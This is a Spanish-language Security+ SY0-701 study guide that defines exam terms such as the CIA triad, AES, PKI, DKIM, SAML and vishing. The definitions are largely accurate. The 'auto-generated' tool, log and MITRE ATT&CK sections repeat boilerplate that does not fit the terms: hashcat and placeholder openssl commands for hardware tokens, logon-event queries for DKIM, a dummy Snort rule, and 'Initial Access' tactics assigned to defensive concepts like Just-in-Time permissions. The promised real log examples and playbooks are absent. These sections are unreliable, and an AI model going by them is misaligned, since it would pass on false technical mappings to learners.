# 📘 Security+ SY0-701 - Material SOC-Level COMPLETO
**Versión:** 4.0 - SOC Professional  **Creado:** 2026-03-04 10:17:07  **Total términos ALTA prioridad:** 220  **Extensiones manuales SOC:** 13  
---

## 🎯 Objetivo

Material extendido para **superar nivel SOC Analyst 1** y **aprobar Security+ con 85%+**.

Cada término incluye:
- ✅ **Herramientas y comandos prácticos**
- ✅ **Log analysis con ejemplos reales**
- ✅ **MITRE ATT&CK mapping**
- ✅ **Response playbooks paso a paso**
- ✅ **False positives comunes y tuning**
- ✅ **Casos reales de incidentes**
- ✅ **Enterprise integration (Windows/Linux/Cloud)**

---

## Dominio 1 Conceptos Generales Seguridad

**Peso examen:** 12%  **Términos ALTA prioridad:** 45  

### CIA Triad

**Definición:** Tríada de seguridad fundamental: Confidencialidad (solo personas autorizadas acceden), Integridad (datos no modificados sin autorización), Disponibilidad (acceso cuando se necesita)

**Ejemplos:**
- Confidencialidad: cifrado de datos sensibles
- Integridad: hashing para verificar archivos
- Disponibilidad: sistemas redundantes y backups

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### AAA Framework

**Definición:** Authentication (verificar identidad), Authorization (dar permisos), Accounting (registrar acciones). Marco de control de acceso

**Ejemplos:**
- Login con usuario/contraseña (Authentication) → permisos de lectura/escritura (Authorization) → logs de acceso (Accounting)
- RADIUS y TACACS+ implementan AAA

#### 🔧 Herramientas (Extension: auto-generated)

**Event Viewer:**  
- Propósito: Análisis de autenticación  
- Comando: `Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4625}`  
- Output: Eventos de logon  

**grep:**  
- Propósito: Búsqueda en auth logs Linux  
- Comando: `grep 'Failed password' /var/log/auth.log`  
- Output: Intentos fallidos  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4624 (success), 4625 (failure), 4648 (explicit credentials)
- Linux: /var/log/auth.log, /var/log/secure
- RADIUS/TACACS+ logs

---

### Zero Trust

**Definición:** Modelo de seguridad que NO confía en ninguna entidad automáticamente. Verificar siempre, dentro o fuera de la red. 'Never trust, always verify'

**Ejemplos:**
- Verificar cada conexión incluso dentro de la LAN corporativa
- MFA obligatorio para todos los accesos
- Microsegmentación de red
- Adaptive identity basada en contexto

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con Zero Trust  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### Defense in Depth

**Definición:** Múltiples capas de seguridad. Si una falla, las demás protegen. Concepto de defensa en profundidad

**Ejemplos:**
- Firewall → IDS → WAF → Antivirus → EDR → SIEM
- Seguridad física + red + aplicación + datos

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Tipos de Controles de Seguridad

**Definición:** Preventivo (evita incidentes), Detective (detecta incidentes), Correctivo (corrige tras incidente), Compensatorio (alternativa cuando el control preferido no es viable), Directivo (políticas y procedimientos), Disuasorio (desalienta ataques)

**Ejemplos:**
- Preventivo: firewall/AV
- Detective: IDS/SIEM/CCTV
- Correctivo: backups
- Compensatorio: MFA si no hay biometría
- Directivo: AUP
- Disuasorio: cámaras visibles

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Tipos de Controles de Seguridad  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Tipos de Controles de Seguridad
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Tipos de Controles de Seguridad  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Categorías de Controles

**Definición:** Técnico/Lógico (tecnología/sistemas), Gerencial/Administrativo (políticas/procedimientos), Operacional (personas/procesos diarios), Físico (instalaciones materiales)

**Ejemplos:**
- Técnico: cifrado, firewall, EDR
- Gerencial: políticas de seguridad, formación
- Operacional: guardias, procedimientos de backup
- Físico: cerraduras, cámaras, vallas

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### AES (Advanced Encryption Standard)

**Definición:** Algoritmo de cifrado simétrico estándar. Claves de 128, 192 o 256 bits. Rápido y seguro

**Ejemplos:**
- AES-256 para cifrado de disco BitLocker
- AES-128 en WPA2
- AES-GCM en TLS

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con AES (Advanced Encryption Standard)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### RSA

**Definición:** Algoritmo de cifrado asimétrico. Par de claves pública/privada. Usado para cifrado y firmas digitales

**Ejemplos:**
- Certificados SSL/TLS
- Firma digital de emails S/MIME
- Intercambio seguro de claves simétricas
- Claves de 2048-4096 bits

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con RSA  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### DHE (Diffie-Hellman Ephemeral)

**Definición:** Intercambio de claves Diffie-Hellman con claves efimeras temporales. Perfect Forward Secrecy. Nueva clave cada sesion

**Ejemplos:**
- TLS_DHE_RSA cipher suites
- PFS (Perfect Forward Secrecy)
- Protege sesiones pasadas
- ECDHE mas rapido

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con DHE (Diffie-Hellman Ephemeral)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### Hashing

**Definición:** Función criptográfica unidireccional que genera un valor de longitud fija (hash) a partir de datos de cualquier tamaño. NO es reversible

**Ejemplos:**
- SHA-256 para verificar integridad de archivos
- Bcrypt/Argon2 para almacenar contraseñas
- MD5 (obsoleto, vulnerable a colisiones)

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con Hashing  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### SHA (Secure Hash Algorithm)

**Definición:** Familia de funciones hash criptográficas. SHA-1 (obsoleto), SHA-2 (SHA-256, SHA-512 - recomendado), SHA-3 (último estándar)

**Ejemplos:**
- SHA-256 para blockchain Bitcoin
- SHA-512 para passwords
- SHA-1 DEPRECADO (colisiones)

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con SHA (Secure Hash Algorithm)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### Digital Signature

**Definición:** Firma digital para verificar autenticidad e integridad de documentos. Usa criptografia asimetrica (firma con clave privada, verifica con publica)

**Ejemplos:**
- Firmar PDF con certificado
- Algoritmos: RSA, DSA, ECDSA
- Proporciona autenticacion, integridad, no repudio

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con Digital Signature  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### DSA (Digital Signature Algorithm)

**Definición:** Algoritmo para firmas digitales. Autenticacion, integridad, no repudio. Basado en logaritmo discreto. No para cifrado

**Ejemplos:**
- DSA keys 1024-3072 bits
- FIPS 186-4 standard
- Solo firmas, NO cifrado
- SSH host keys

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con DSA (Digital Signature Algorithm)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### ECDSA (Elliptic Curve Digital Signature Algorithm)

**Definición:** DSA basado en criptografia de curva eliptica. Mas eficiente computacionalmente. Menor tamaño de clave para misma seguridad

**Ejemplos:**
- 256-bit ECDSA = 3072-bit RSA security
- Bitcoin signatures
- TLS certificates
- Mas rapido que RSA/DSA

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con ECDSA (Elliptic Curve Digital Signature Algorithm)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### PKI (Public Key Infrastructure)

**Definición:** Infraestructura de gestión de certificados digitales. Incluye CA (Certificate Authority), RA (Registration Authority), certificados X.509

**Ejemplos:**
- CA emite certificado SSL para sitio web
- RA verifica identidad del solicitante
- CRL lista certificados revocados

#### 🔧 Herramientas (Extension: auto-generated)

**Event Viewer:**  
- Propósito: Análisis de autenticación  
- Comando: `Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4625}`  
- Output: Eventos de logon  

**grep:**  
- Propósito: Búsqueda en auth logs Linux  
- Comando: `grep 'Failed password' /var/log/auth.log`  
- Output: Intentos fallidos  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4624 (success), 4625 (failure), 4648 (explicit credentials)
- Linux: /var/log/auth.log, /var/log/secure
- RADIUS/TACACS+ logs

---

### Certificado Digital X.509

**Definición:** Documento que vincula una clave pública a una identidad. Firmado por una CA. Contiene: titular, clave pública, CA emisora, periodo validez

**Ejemplos:**
- Certificado SSL/TLS para HTTPS
- Certificado de firma de código
- Certificado de usuario para S/MIME

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con Certificado Digital X.509  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### CA (Certificate Authority)

**Definición:** Tercera parte confiable que emite, revoca y gestiona certificados digitales. Raiz de confianza en PKI

**Ejemplos:**
- DigiCert
- Let's Encrypt
- Verisign
- Root CA → Intermediate CA → End-entity certificates

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### OCSP (Online Certificate Status Protocol)

**Definición:** Protocolo para verificar estado de revocacion de certificado en tiempo real. Mas rapido que CRL

**Ejemplos:**
- Consulta individual de certificado
- Respuesta: good/revoked/unknown
- Puerto 80 HTTP
- OCSP stapling mejora rendimiento

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### TPM (Trusted Platform Module)

**Definición:** Chip criptográfico en placa base para almacenar claves, certificados y realizar operaciones de seguridad. Secure boot, cifrado de disco

**Ejemplos:**
- BitLocker usa TPM para cifrado
- Almacenar claves RSA de forma segura
- Attestation de integridad del sistema

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con TPM (Trusted Platform Module)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### FDE (Full Disk Encryption)

**Definición:** Cifrado completo del disco por software. Protege TODOS los datos en reposo

**Ejemplos:**
- BitLocker (Windows)
- FileVault (macOS)
- LUKS (Linux)

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con FDE (Full Disk Encryption)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### WPA2/WPA3

**Definición:** Protocolos de seguridad Wi-Fi. WPA2 usa AES-CCMP. WPA3 añade SAE (mejor proteccion contra fuerza bruta) y cifrado individualizado

**Ejemplos:**
- WPA2-Personal (PSK)
- WPA3-Enterprise con 802.1X y RADIUS
- WPA3-SAE protege contra KRACK

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con WPA2/WPA3  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### SAE (Simultaneous Authentication of Equals)

**Definición:** Metodo de autenticacion en WPA3 que reemplaza el handshake PSK de WPA2. Resistente a ataques offline de fuerza bruta

**Ejemplos:**
- WPA3-Personal usa SAE
- Proteccion contra ataques de diccionario incluso capturando handshake

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a SAE (Simultaneous Authentication of Equals)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a SAE (Simultaneous Authentication of Equals)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con SAE (Simultaneous Authentication of Equals)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### 802.1X

**Definición:** Estandar IEEE para control de acceso a red basado en puertos (NAC). Usa EAP para autenticacion. Requiere: Suplicante, Autenticador, Servidor AAA (RADIUS)

**Ejemplos:**
- WPA2/WPA3 Enterprise
- Autenticacion de switches con RADIUS
- Suplicante=cliente, Autenticador=AP/switch, AAA=RADIUS server

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con 802.1X  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### MDM (Mobile Device Management)

**Definición:** Gestion centralizada de dispositivos moviles: configuracion, seguridad, aplicaciones, politicas. Control remoto de smartphones/tablets corporativos

**Ejemplos:**
- Borrado remoto de dispositivo perdido
- Forzar cifrado y PIN
- Distribuir apps corporativas
- Geofencing
- Soluciones: Intune, Jamf, MobileIron

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### DKIM (DomainKeys Identified Mail)

**Definición:** Firma digital en cabeceras de email para verificar autenticidad del remitente y que no fue modificado. Usa criptografia asimetrica

**Ejemplos:**
- Clave privada firma email saliente
- Clave publica en DNS TXT record
- Previene spoofing y phishing

#### 🔧 Herramientas (Extension: auto-generated)

**Event Viewer:**  
- Propósito: Análisis de autenticación  
- Comando: `Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4625}`  
- Output: Eventos de logon  

**grep:**  
- Propósito: Búsqueda en auth logs Linux  
- Comando: `grep 'Failed password' /var/log/auth.log`  
- Output: Intentos fallidos  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4624 (success), 4625 (failure), 4648 (explicit credentials)
- Linux: /var/log/auth.log, /var/log/secure
- RADIUS/TACACS+ logs

---

### DMARC (Domain-based Message Authentication)

**Definición:** Politica de autenticacion de email que usa SPF y DKIM. Define que hacer con emails que fallan validacion (none/quarantine/reject)

**Ejemplos:**
- Publicar politica en DNS TXT: v=DMARC1; p=reject
- Recibir reportes de emails rechazados
- Proteccion contra phishing y spoofing

#### 🔧 Herramientas (Extension: auto-generated)

**Event Viewer:**  
- Propósito: Análisis de autenticación  
- Comando: `Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4625}`  
- Output: Eventos de logon  

**grep:**  
- Propósito: Búsqueda en auth logs Linux  
- Comando: `grep 'Failed password' /var/log/auth.log`  
- Output: Intentos fallidos  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4624 (success), 4625 (failure), 4648 (explicit credentials)
- Linux: /var/log/auth.log, /var/log/secure
- RADIUS/TACACS+ logs

---

### SPF (Sender Policy Framework)

**Definición:** Record DNS que especifica que servidores pueden enviar email desde un dominio. Previene email spoofing

**Ejemplos:**
- v=spf1 ip4:192.0.2.0/24 include:_spf.google.com -all
- Softfail (~all) vs Hardfail (-all)
- Complementa DKIM y DMARC

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### OpenID Connect

**Definición:** Capa de identidad sobre OAuth 2.0. Permite autenticacion federada (Single Sign-On). Devuelve ID token (JWT) con info del usuario

**Ejemplos:**
- Login con Google/Microsoft en apps terceras
- ID token + Access token
- Proveedores: Google, Okta, Auth0

#### 🔧 Herramientas (Extension: auto-generated)

**Event Viewer:**  
- Propósito: Análisis de autenticación  
- Comando: `Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4625}`  
- Output: Eventos de logon  

**grep:**  
- Propósito: Búsqueda en auth logs Linux  
- Comando: `grep 'Failed password' /var/log/auth.log`  
- Output: Intentos fallidos  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4624 (success), 4625 (failure), 4648 (explicit credentials)
- Linux: /var/log/auth.log, /var/log/secure
- RADIUS/TACACS+ logs

---

### SAML (Security Assertion Markup Language)

**Definición:** Estandar XML para intercambio de autenticacion/autorizacion entre Identity Provider (IdP) y Service Provider (SP). SSO empresarial

**Ejemplos:**
- Login corporativo unico para multiples apps SaaS
- IdP (AD FS, Okta) emite SAML assertion
- SP (Salesforce, AWS) consume assertion

#### 🔧 Herramientas (Extension: auto-generated)

**Event Viewer:**  
- Propósito: Análisis de autenticación  
- Comando: `Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4625}`  
- Output: Eventos de logon  

**grep:**  
- Propósito: Búsqueda en auth logs Linux  
- Comando: `grep 'Failed password' /var/log/auth.log`  
- Output: Intentos fallidos  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4624 (success), 4625 (failure), 4648 (explicit credentials)
- Linux: /var/log/auth.log, /var/log/secure
- RADIUS/TACACS+ logs

---

### Tipos de Biometria

**Definición:** Autenticacion basada en caracteristicas fisicas/comportamentales. Fisiologica: huella, iris, facial. Comportamental: firma, patron de tecleo, voz

**Ejemplos:**
- Fingerprint scanner (Touch ID)
- Iris/retina scan
- Facial recognition (Face ID)
- Voice recognition
- Gait analysis
- Metricas: FAR, FRR, CER

#### 🔧 Herramientas (Extension: auto-generated)

**Event Viewer:**  
- Propósito: Análisis de autenticación  
- Comando: `Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4625}`  
- Output: Eventos de logon  

**grep:**  
- Propósito: Búsqueda en auth logs Linux  
- Comando: `grep 'Failed password' /var/log/auth.log`  
- Output: Intentos fallidos  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4624 (success), 4625 (failure), 4648 (explicit credentials)
- Linux: /var/log/auth.log, /var/log/secure
- RADIUS/TACACS+ logs

---

### Hardware Tokens

**Definición:** Dispositivos fisicos para autenticacion. Tipos: Key fob (OTP), Security key (FIDO2/U2F), RFID badge, Smart card

**Ejemplos:**
- RSA SecurID (key fob con OTP)
- YubiKey (FIDO2)
- Tarjeta RFID para acceso fisico
- Smart card con PKI

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con Hardware Tokens  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### Security Key

**Definición:** Token de hardware para autenticacion sin contraseña. Soporta FIDO2/U2F/WebAuthn. Resistente a phishing

**Ejemplos:**
- YubiKey
- Google Titan Key
- Autenticacion tocando boton fisico
- Funciona via USB/NFC/Bluetooth

#### 🔧 Herramientas (Extension: auto-generated)

**Event Viewer:**  
- Propósito: Análisis de autenticación  
- Comando: `Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624,4625}`  
- Output: Eventos de logon  

**grep:**  
- Propósito: Búsqueda en auth logs Linux  
- Comando: `grep 'Failed password' /var/log/auth.log`  
- Output: Intentos fallidos  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4624 (success), 4625 (failure), 4648 (explicit credentials)
- Linux: /var/log/auth.log, /var/log/secure
- RADIUS/TACACS+ logs

---

### Politicas de Contraseña

**Definición:** Reglas de complejidad, longitud, historial, expiracion. Requisitos: minimo caracteres, mayusculas, numeros, simbolos

**Ejemplos:**
- Minimo 12 caracteres
- Cambio cada 90 dias (NIST ya no recomienda expiracion)
- No reusar ultimas 5 contraseñas
- Lockout tras 5 intentos fallidos

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### OTP (One-Time Password)

**Definición:** Contraseña valida para una sola sesion o transaccion. Genera codigo temporal. Componente MFA. Caduca rapidamente

**Ejemplos:**
- TOTP (Time-based)
- HOTP (Counter-based)
- SMS OTP
- Google Authenticator
- Valido 30-60 segundos

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Just-in-Time Permissions (Permisos justo a tiempo)

**Definición:** Acceso efimero temporal. Privilegios otorgados solo cuando se necesitan. Se revocan automaticamente tras uso. Reduce superficie de ataque

**Ejemplos:**
- Admin access por 2 horas
- Elevacion temporal privilegios
- Zero Standing Privileges
- PAM JIT

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Just-in-Time Permissions (Permisos justo a tiempo)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Just-in-Time Permissions (Permisos justo a tiempo)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Just-in-Time Permissions (Permisos justo a tiempo)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### SHA-3

**Definición:** Familia de funciones hash criptograficas mas reciente. Mayor seguridad que SHA-2. Algoritmo Keccak

**Ejemplos:**
- SHA3-256
- SHA3-512
- Resistente a ataques de colision
- Reemplazo de SHA-2 para maxima seguridad

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con SHA-3  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### Digital Certificate

**Definición:** Documento digital que verifica identidad de individuo/dispositivo/organizacion. Emitido por CA. Contiene clave publica + info del titular

**Ejemplos:**
- Certificado SSL/TLS para HTTPS
- Certificado de email S/MIME
- Componentes: Subject, Issuer, Public Key, Validity

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con Digital Certificate  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### Vishing

**Definición:** Phishing por voz (telefono/VoIP). Atacante llama haciendose pasar por entidad legitima para robar informacion

**Ejemplos:**
- Llamada falsa de soporte tecnico
- IRS scam calls
- Spoofing de caller ID

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Pharming

**Definición:** Redireccion de trafico web a sitio falso mediante envenenamiento DNS o modificacion de archivo hosts. Sin interaccion del usuario

**Ejemplos:**
- Modificar archivo hosts local
- DNS cache poisoning
- Usuario escribe URL correcta pero va a sitio falso

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con Pharming  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### MSSP (Managed Security Service Provider)

**Definición:** Proveedor externo especializado en seguridad IT. Ofrece SOC, SIEM, gestion de vulnerabilidades, respuesta a incidentes

**Ejemplos:**
- SOC as a Service
- Gestion de firewall y IDS
- Threat intelligence
- Compliance monitoring

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a MSSP (Managed Security Service Provider)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a MSSP (Managed Security Service Provider)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con MSSP (Managed Security Service Provider)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### STARTTLS

**Definición:** Comando para actualizar conexion no cifrada a cifrada con TLS. Usado en SMTP, IMAP, POP3. Puerto 587 para SMTP

**Ejemplos:**
- SMTP puerto 587 con STARTTLS
- Comienza sin cifrar, luego upgrade a TLS
- Mejor practica actual vs SMTPS

